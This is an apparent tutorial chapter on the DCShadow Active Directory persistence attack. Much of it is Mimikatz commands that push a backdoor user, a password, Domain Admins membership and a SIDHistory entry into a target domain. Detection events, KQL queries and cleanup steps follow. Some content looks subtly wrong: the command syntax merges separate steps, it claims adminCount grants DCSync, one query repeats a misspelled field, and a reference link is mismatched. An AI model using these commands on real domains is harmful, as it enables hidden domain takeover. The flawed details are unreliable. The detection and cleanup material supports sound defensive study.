# DCShadow Attack

## Overview

**DCShadow** is a sophisticated persistence technique that bypasses normal AD replication controls. It temporarily registers a rogue Domain Controller and pushes malicious AD objects (e.g., users with DCSync privileges, modified ACLs) into the directory via replication.

Unlike most AD backdoors that modify objects directly (generating event 5136 for each change), DCShadow **masquerades as a legitimate DC replication partner** and pushes changes that look like normal directory replication traffic.

**Key Advantage:** Changes pushed via DCShadow do not generate typical "object modified" audit events (5136/5141) on the destination DC — they appear as normal replication from a peer DC.

---

## Prerequisites

- **Enterprise Admin** privileges (required for the DC replication rights)
- At least **Domain Admin** privileges in the target domain
- Ability to write to `C:\Windows\System32\` or wherever Mimikatz runs from
- Network connectivity to a Domain Controller (port 389, 636, 3268-3269)
- Tools: **Mimikatz** (version 2.1.1+), **MS-DRSR protocol**

---

## Step 1: Prepare the Rogue DC

DCShadow works in two phases:

### Phase 1 — Server Setup
The attacker's machine registers as a DC in the configuration partition of AD.

### Phase 2 — Object Push
The rogue DC pushes changes (user objects, SIDHistory, group memberships) via replication.

---

## Step 2: Execute DCShadow Push

### Push a New User with DCSync Rights

```cmd
mimikatz.exe privilege::debug
```

**Create a backdoor user:**

```cmd
lsadump::dcshadow /push /object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local /attribute:displayName /value:DCShadowBackdoor
```

**Set password for the new user (modify userPassword attribute):**

```cmd
lsadump::dcshadow /push /object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local /attribute:userPassword /value:P@ssw0rd123!
```

**Add user to Domain Admins group:**

```cmd
lsadump::dcshadow /push /object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local /attribute:memberOf /value:CN=Domain Admins,CN=Users,DC=targetdomain,DC=local
```

**Grant DCSync rights (Replication-Get-Changes-All) via adminCount and SIDHistory:**

```cmd
lsadump::dcshadow /push /object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local /attribute:adminCount /value:1
```

### Bulk Push from a Configuration File

```cmd
lsadump::dcshadow /push /config:dcshadow_config.txt
```

Example `dcshadow_config.txt`:

```
object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local
attribute:userPassword
value:BackdoorPass123!

attribute:memberOf
value:CN=Domain Admins,CN=Users,DC=targetdomain,DC=local

attribute:servicePrincipalName
value:HOST/dcshadow-backdoor
```

### Push a SIDHistory backdoor

SIDHistory allows a user to effectively be a member of another domain/group. Push this to make a low-privilege user inherit Domain Admin rights:

```cmd
lsadump::dcshadow /push /object:CN=backdoor_user,CN=Users,DC=targetdomain,DC=local /attribute:sIDHistory /value:S-1-5-21-<domain_sid>-512
```

Where `S-1-5-21-<domain_sid>-512` is the SID of the Domain Admins group.

---

## Step 3: Verify the Push

After pushing, the object appears as if it was created via normal replication:

```powershell
Get-ADUser backdoor_user -Properties memberOf

Get-ADGroupMember "Domain Admins"
```

The user will be a member of Domain Admins and can now authenticate normally:

```cmd
net use \\DC01\C$ /user:targetdomain\backdoor_user BackdoorPass123!
```

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **Enterprise Admin Required** | The `Replicate-*` permissions needed for DCShadow are normally only held by Enterprise Admins, Domain Admins, and the Domain Controllers themselves. |
| **Audit Suppression** | DCShadow suppresses normal 5136/5141 audit events — the changes are not audited on the target DC. |
| **Replication Events** | Event 4662 (Directory Service Access) for replication still fires. |
| **Temporary Service** | DCShadow registers a temporary `NTDS Settings` object and `server reference` — these may be visible in ADSI Edit during the push window. |
| **Cleanup** | After the push, the rogue server reference is removed automatically, but incomplete cleanup may leave artifacts. |
| **Detection Tooling** | Microsoft's "Advanced Threat Analytics" (ATA) and "Defender for Identity" specifically detect DCShadow patterns. |
| **Replication Metadata** | The pushed object will show replication metadata from a "fake" DC invocation ID — investigators can trace this. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4662** | Directory Service Access (replication extended right) | DC Security Log |
| **4928** | An Active Directory replica source naming context was established | DC Security Log |
| **4929** | An Active Directory replica source naming context was removed | DC Security Log |
| **4930** | An Active Directory replica source naming context was modified | DC Security Log |
| **4931** | An Active Directory replica destination naming context was modified | DC Security Log |
| **4932** | Synchronization of a replica of an Active Directory naming context has begun | DC Security Log |
| **4933** | Synchronization of a replica of an Active Directory naming context has ended | DC Security Log |
| **5137** | A directory service object was created | DC Security Log |
| **5141** | A directory service object was deleted | DC Security Log |
| **4742** | A computer account was changed | DC Security Log |

### Detection Indicators

1. **New server object appearing in the Configuration partition** without the steps of a normal DC promotion
2. **Replication from a non-DC** — Event 4928/4929 showing a source DC that is not a known Domain Controller
3. **Event 4662 with GUID of `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`** (DS-Replication-Get-Changes-All right) from unexpected source
4. **Abnormal replication metadata** — `InvocationId` does not match any known DC
5. **USN (Update Sequence Number) anomalies** — Object USN values from a non-DC source

### Detection Queries

**KQL — Detect Replication from Unknown Source:**

```
SecurityEvent
| where EventID == 4928 or EventID == 4929
| summarize by SourceDAddress, SourceDAddress
| where SourceDAddress not in (known_dc_ips)
```

**KQL — Detect Event 4662 for Replication:**

```
SecurityEvent
| where EventID == 4662
| where ObjectServer == "DS"
| where AccessMask contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
| where Account !in ("DOMAIN\DC01$", "DOMAIN\DC02$")
```

### Microsoft Defender for Identity

Defender for Identity explicitly detects DCShadow with the alert **"Suspicious replication of directory services"** or **"Directory service replication with a non-DC server"**.

---

## Cleanup / Reversal

### Remove Pushed Objects

If a backdoor user was pushed:

```powershell
Remove-ADUser -Identity "CN=backdoor_user,CN=Users,DC=targetdomain,DC=local" -Confirm:$false
```

### Remove SIDHistory

```powershell
Set-ADUser backdoor_user -Remove @{SIDHistory = 'S-1-5-21-<domain_sid>-512'}
```

### Cleanup AD Configuration Artifacts

If the DCShadow push left artifacts (the rogue DC's reference in the Configuration partition), remove them manually:

1. Open **ADSI Edit** (from RSAT or on a DC)
2. Connect to the **Configuration** naming context
3. Navigate to:
   ```
   CN=Sites,CN=Configuration,DC=targetdomain,DC=local
   ```
4. Look for suspicious `CN=NTDS Settings` objects under the Default-First-Site-Name
5. Delete any objects that correspond to the attacker's machine

### Verify Cleanup

```powershell
Get-ADObject -Filter * -SearchBase (Get-ADRootDSE).ConfigurationNamingContext | Where-Object { $_.Name -like "*attacker*" }
```

### Post-Cleanup

- Reset KRBTGT password twice
- Audit all privileged group memberships
- Check for unauthorized SIDHistory entries
- Verify DC replication topology is clean
- Review all DC replication events (4928-4933) for the past 30 days

---

## Comparison: DCShadow vs. Direct Modification

| Aspect | DCShadow | Direct ACL Modification |
|--------|----------|------------------------|
| **Event 5136 generated** | No | Yes |
| **Event 4662 generated** | Yes (as replication) | Yes (as modification) |
| **Permission required** | Enterprise Admin | Domain Admin |
| **Traffic pattern** | MS-DRSR replication | LDAP modify |
| **Detection difficulty** | Harder (looks like replication) | Easier (direct object modification) |
| **Replication metadata** | Traces to rogue DC | Traces to modifying DC |

---

## References

- [Gentilkiwi — DCShadow](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcshadow)
- [Benjamin Delpy — DCShadow at BlueHat 2018](https://github.com/gentilkiwi/BlueHatIL-2018)
- [ADSecurity — DCShadow](https://adsecurity.org/?p=4179)
- [Microsoft — How DCShadow Works](https://docs.microsoft.com/en-us/defender-for-identity/security-alerts#suspected-overpass-the-hash-attack-kerberos-explicit-credentials)
- MITRE ATT&CK: T1207 (Rogue Domain Controller)

---

**Next:** [06 - AdminSDHolder Persistence](06_AdminSDHolder_Persistence.md)
